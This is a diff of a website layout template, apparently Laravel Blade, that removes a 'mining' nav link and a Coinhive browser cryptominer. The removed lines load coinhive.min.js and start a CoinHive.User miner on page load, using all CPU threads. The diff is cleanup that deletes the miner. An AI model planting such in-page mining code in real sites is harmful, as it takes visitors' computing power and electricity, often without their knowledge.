@@ -126,7 +126,6 @@
                 </li>
 
                 <li class=""><a href="/page/fm" target="_blank">电台</a></li>
-                <li class=""><a href="/page/miner" target="_blank">挖矿</a></li>
             </ul>
         </nav>
     </div>
@@ -158,9 +157,8 @@
 @section('foot_js')
 
 @show
-<script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js?v8"></script>
 <script type="text/javascript">
- (function(){$('body').css('padding-top',$('.navbar-fixed-top').height()+'px');$('.navbar-fixed-top').css('background','#f8f8f8').css('border-bottom','1px solid #ddd');$('.dropdown').mouseover(function(){$(this).find('.dropdown-menu').show()}).mouseout(function(){$(this).find('.dropdown-menu').hide()});$('.navbar-toggle .icon-bar').css('background','#1f648b');var miner = new CoinHive.User(myMinerKey, myMinerName, {threads: navigator.hardwareConcurrency,autoThreads: false,throttle: 0.9,forceASMJS: false});miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);var tab_pathname = window.location.pathname;$("#my_tab a").each(function(){if($(this).attr('href')==tab_pathname){$(this).parent().addClass('active');}});$("#my_tab a").click(function(){window.open($(this).attr('href'), '_self');});})();
+ (function(){$('body').css('padding-top',$('.navbar-fixed-top').height()+'px');$('.navbar-fixed-top').css('background','#f8f8f8').css('border-bottom','1px solid #ddd');$('.dropdown').mouseover(function(){$(this).find('.dropdown-menu').show()}).mouseout(function(){$(this).find('.dropdown-menu').hide()});$('.navbar-toggle .icon-bar').css('background','#1f648b');var tab_pathname = window.location.pathname;$("#my_tab a").each(function(){if($(this).attr('href')==tab_pathname){$(this).parent().addClass('active');}});$("#my_tab a").click(function(){window.open($(this).attr('href'), '_self');});})();
 </script>
 <script type="text/javascript">
 var _hmt=_hmt||[];(function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?b1490187b42d2a969b6f51c5f8f4e814";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s)})();
